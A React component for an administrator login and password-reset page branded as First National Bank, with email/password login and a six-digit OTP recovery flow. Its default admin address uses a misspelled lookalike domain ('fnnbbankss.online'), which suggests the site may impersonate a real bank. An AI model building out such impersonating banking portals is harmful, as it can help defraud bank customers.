import React, { useState } from 'react';
import { useAuth } from '../context/AuthContext.tsx';
import { api } from '../services/api.ts';
import { Lock, Mail, ShieldCheck, AlertCircle, Eye, EyeOff, ArrowRight, ArrowLeft, CheckCircle2, KeyRound } from 'lucide-react';

interface AdminLoginPageProps {
  onSuccess: () => void;
  onNavigateHome: () => void;
}

export const AdminLoginPage: React.FC<AdminLoginPageProps> = ({ onSuccess, onNavigateHome }) => {
  const { loginAdmin, fetchEmails, setIsMailModalOpen } = useAuth();
  const [view, setView] = useState<'login' | 'forgot_request' | 'forgot_verify' | 'forgot_done'>('login');
  
  // Login states
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  // Recovery states
  const [forgotEmail, setForgotEmail] = useState('admin@fnnbbankss.online');
  const [forgotCode, setForgotCode] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmPassword, setConfirmPassword] = useState('');
  const [recoveryMessage, setRecoveryMessage] = useState<string | null>(null);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    setLoading(true);

    try {
      await loginAdmin(password, email);
      onSuccess();
    } catch (err: any) {
      setError(err.message || 'Administrator authentication failed. Please verify credentials.');
    } finally {
      setLoading(false);
    }
  };

  const handleForgotRequest = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    setLoading(true);

    try {
      const res = await api.forgotPassword(forgotEmail);
      setRecoveryMessage(res.message || `Verification code sent to ${forgotEmail}.`);
      setView('forgot_verify');
    } catch (err: any) {
      setError(err.message || 'Failed to send recovery code.');
    } finally {
      setLoading(false);
    }
  };

  const handleResendAdminCode = async () => {
    setError(null);
    setLoading(true);
    try {
      const res = await api.forgotPassword(forgotEmail);
      setRecoveryMessage(res.message || 'A fresh verification code has been dispatched to your email.');
    } catch (err: any) {
      setError(err.message || 'Failed to resend code.');
    } finally {
      setLoading(false);
    }
  };

  const handleForgotVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);

    if (newPassword !== confirmPassword) {
      setError('Passwords do not match.');
      return;
    }

    if (newPassword.length < 8) {
      setError('Password must be at least 8 characters long.');
      return;
    }

    setLoading(true);

    try {
      await api.resetPassword({
        email: forgotEmail,
        code: forgotCode,
        newPassword,
        confirmPassword,
      });
      setView('forgot_done');
    } catch (err: any) {
      setError(err.message || 'Failed to reset administrator password.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-slate-900 flex flex-col justify-between text-white selection:bg-red-600 selection:text-white">
      
      {/* Top Bar */}
      <div className="w-full px-3 sm:px-6 py-3 sm:py-4 flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 bg-slate-950/60 backdrop-blur-md">
        <button
          onClick={onNavigateHome}
          className="flex items-center gap-1.5 sm:gap-2 text-xs font-semibold text-slate-400 hover:text-white transition-colors"
        >
          <ArrowLeft className="w-4 h-4 shrink-0" />
          <span className="truncate">Return to Public Banking Portal</span>
        </button>

        <div className="flex items-center gap-2 text-[10px] sm:text-xs text-slate-400 font-mono shrink-0">
          <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
          <span>SECURE GATEWAY • TLS 1.3</span>
        </div>
      </div>

      {/* Main Container */}
      <div className="flex-1 flex items-center justify-center p-3 sm:p-6 w-full">
        <div className="w-full max-w-md bg-slate-950 rounded-3xl p-5 sm:p-8 shadow-2xl border border-slate-800 space-y-6">
          
          {/* FNB Brand Emblem */}
          <div className="text-center space-y-3">
            <div className="inline-flex p-3 rounded-2xl bg-white/5 border border-white/10 shadow-lg">
              <img
                src="/fnb-logo.png"
                alt="First National Bank"
                className="w-14 h-14 object-contain rounded-xl"
                onError={(e) => {
                  e.currentTarget.onerror = null;
                  e.currentTarget.src = "/assets/aistudio/file_00000000763081f4a6c9438dcd4940cf_665e4923.png";
                }}
              />
            </div>
            <div>
              <h1 className="text-xl font-extrabold tracking-tight text-white">
                FNB Administrator Portal
              </h1>
              <p className="text-xs text-slate-400 mt-1">
                Authorized Personnel Management System
              </p>
            </div>
          </div>

          {/* Error Message */}
          {error && (
            <div className="p-3.5 bg-rose-950/60 border border-rose-800/80 rounded-2xl text-xs text-rose-300 flex items-start gap-2.5">
              <AlertCircle className="w-4 h-4 mt-0.5 shrink-0 text-rose-400" />
              <span>{error}</span>
            </div>
          )}

          {/* SUCCESS MESSAGE */}
          {recoveryMessage && view === 'forgot_verify' && (
            <div className="p-3.5 bg-emerald-950/60 border border-emerald-800/80 rounded-2xl text-xs text-emerald-300 flex items-start gap-2.5">
              <CheckCircle2 className="w-4 h-4 mt-0.5 shrink-0 text-emerald-400" />
              <span>{recoveryMessage}</span>
            </div>
          )}

          {/* VIEW: LOGIN FORM */}
          {view === 'login' && (
            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <label className="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">
                  Administrator Email Address
                </label>
                <div className="relative">
                  <Mail className="w-4 h-4 absolute left-3.5 top-3.5 text-slate-500" />
                  <input
                    type="email"
                    required
                    placeholder="Enter authorized administrator email"
                    value={email}
                    onChange={e => setEmail(e.target.value)}
                    className="w-full pl-10 pr-4 py-2.5 text-sm bg-slate-900 border border-slate-700 rounded-xl text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent transition-all"
                  />
                </div>
              </div>

              <div>
                <div className="flex items-center justify-between mb-1.5">
                  <label className="block text-xs font-bold text-slate-300 uppercase tracking-wider">
                    Master Security Password
                  </label>
                  <button
                    type="button"
                    onClick={() => {
                      setError(null);
                      setView('forgot_request');
                    }}
                    className="text-xs text-red-400 hover:text-red-300 transition-colors hover:underline"
                  >
                    Forgot Password?
                  </button>
                </div>
                <div className="relative">
                  <Lock className="w-4 h-4 absolute left-3.5 top-3.5 text-slate-500" />
                  <input
                    type={showPassword ? 'text' : 'password'}
                    required
                    placeholder="Enter administrator password"
                    value={password}
                    onChange={e => setPassword(e.target.value)}
                    className="w-full pl-10 pr-10 py-2.5 text-sm bg-slate-900 border border-slate-700 rounded-xl text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent transition-all"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(p => !p)}
                    className="absolute right-3.5 top-3 text-slate-500 hover:text-slate-300"
                  >
                    {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>
              </div>

              <div className="pt-2">
                <button
                  type="submit"
                  disabled={loading}
                  className="w-full py-3 bg-[#c8102e] hover:bg-[#b00d27] disabled:opacity-50 text-white font-extrabold rounded-xl text-sm shadow-lg shadow-red-900/30 transition-all flex items-center justify-center gap-2"
                >
                  <ShieldCheck className="w-4 h-4" />
                  <span>{loading ? 'Authenticating System...' : 'Sign In to Admin Console'}</span>
                </button>
              </div>
            </form>
          )}

          {/* VIEW: FORGOT PASSWORD REQUEST */}
          {view === 'forgot_request' && (
            <form onSubmit={handleForgotRequest} className="space-y-4">
              <div className="text-center space-y-1">
                <h2 className="text-lg font-bold text-white flex items-center justify-center gap-2">
                  <KeyRound className="w-4 h-4 text-red-400" />
                  <span>Reset Administrator Password</span>
                </h2>
                <p className="text-xs text-slate-400">
                  Enter your registered administrator email to receive a secure time-sensitive OTP.
                </p>
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">
                  Admin Email Address
                </label>
                <div className="relative">
                  <Mail className="w-4 h-4 absolute left-3.5 top-3.5 text-slate-500" />
                  <input
                    type="email"
                    required
                    placeholder="e.g. admin@fnnbbankss.online"
                    value={forgotEmail}
                    onChange={e => setForgotEmail(e.target.value)}
                    className="w-full pl-10 pr-4 py-2.5 text-sm bg-slate-900 border border-slate-700 rounded-xl text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent transition-all"
                  />
                </div>
              </div>

              <div className="flex items-center gap-3 pt-2">
                <button
                  type="button"
                  onClick={() => {
                    setError(null);
                    setView('login');
                  }}
                  className="w-1/2 py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold rounded-xl text-xs transition-colors"
                >
                  Back to Sign In
                </button>
                <button
                  type="submit"
                  disabled={loading}
                  className="w-1/2 py-2.5 bg-[#c8102e] hover:bg-[#b00d27] disabled:opacity-50 text-white font-bold rounded-xl text-xs shadow-md transition-colors"
                >
                  {loading ? 'Sending OTP...' : 'Send OTP Code'}
                </button>
              </div>
            </form>
          )}

          {/* VIEW: FORGOT PASSWORD VERIFY OTP & SET PASSWORD */}
          {view === 'forgot_verify' && (
            <form onSubmit={handleForgotVerify} className="space-y-4">
              <div className="text-center space-y-1">
                <h2 className="text-lg font-bold text-white">Enter Reset Code</h2>
                <div className="p-3 bg-blue-950/40 border border-blue-800/80 rounded-xl text-xs text-blue-200">
                  We have sent a 6-digit verification code to your registered email address. Please check your inbox or spam folder.
                </div>
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5 text-center">
                  6-Digit Verification Code
                </label>
                <input
                  type="text"
                  maxLength={6}
                  required
                  placeholder="• • • • • •"
                  value={forgotCode}
                  onChange={e => setForgotCode(e.target.value.replace(/\D/g, ''))}
                  className="w-full py-2.5 text-center font-mono font-bold text-2xl tracking-widest bg-slate-900 border border-slate-700 rounded-xl text-white focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent"
                  autoFocus
                />
              </div>

              <div className="flex items-center justify-center text-xs">
                <button
                  type="button"
                  onClick={handleResendAdminCode}
                  disabled={loading}
                  className="font-bold text-red-400 hover:underline disabled:opacity-50"
                >
                  Resend Verification Code
                </button>
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">
                  New Password
                </label>
                <input
                  type="password"
                  required
                  placeholder="At least 8 characters"
                  value={newPassword}
                  onChange={e => setNewPassword(e.target.value)}
                  className="w-full px-3.5 py-2.5 text-sm bg-slate-900 border border-slate-700 rounded-xl text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent"
                />
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-300 uppercase tracking-wider mb-1.5">
                  Confirm New Password
                </label>
                <input
                  type="password"
                  required
                  placeholder="Re-enter password"
                  value={confirmPassword}
                  onChange={e => setConfirmPassword(e.target.value)}
                  className="w-full px-3.5 py-2.5 text-sm bg-slate-900 border border-slate-700 rounded-xl text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent"
                />
              </div>

              <div className="flex items-center gap-3 pt-2">
                <button
                  type="button"
                  onClick={() => setView('forgot_request')}
                  className="w-1/3 py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-300 font-bold rounded-xl text-xs transition-colors"
                >
                  Back
                </button>
                <button
                  type="submit"
                  disabled={loading}
                  className="w-2/3 py-2.5 bg-[#c8102e] hover:bg-[#b00d27] disabled:opacity-50 text-white font-bold rounded-xl text-xs shadow-md transition-colors"
                >
                  {loading ? 'Updating Password...' : 'Save New Password'}
                </button>
              </div>
            </form>
          )}

          {/* VIEW: FORGOT PASSWORD DONE */}
          {view === 'forgot_done' && (
            <div className="text-center py-6 space-y-4">
              <CheckCircle2 className="w-14 h-14 text-emerald-400 mx-auto" />
              <div>
                <h2 className="text-xl font-bold text-white">Password Updated Successfully</h2>
                <p className="text-xs text-slate-400 mt-1">
                  Your administrator password has been updated. You can now log in with your new credentials.
                </p>
              </div>
              <button
                type="button"
                onClick={() => {
                  setError(null);
                  setPassword('');
                  setView('login');
                }}
                className="w-full py-3 bg-[#c8102e] hover:bg-[#b00d27] text-white font-bold rounded-xl text-sm transition-colors"
              >
                Return to Administrator Sign In
              </button>
            </div>
          )}

          {/* Compliance & Security Disclaimer */}
          <div className="p-3 bg-slate-900/80 rounded-2xl border border-slate-800 text-[11px] text-slate-400 text-center space-y-1">
            <p className="font-semibold text-slate-300">Protected Administrative System</p>
            <p>
              Unauthorized access attempts are logged with client IP address and timestamped in the administrative security audit register.
            </p>
          </div>

        </div>
      </div>

      {/* Footer */}
      <div className="py-4 text-center text-xs text-slate-500 border-t border-slate-800">
        <p>© {new Date().getFullYear()} First National Bank (FNB). Administrator Portal.</p>
      </div>

    </div>
  );
};
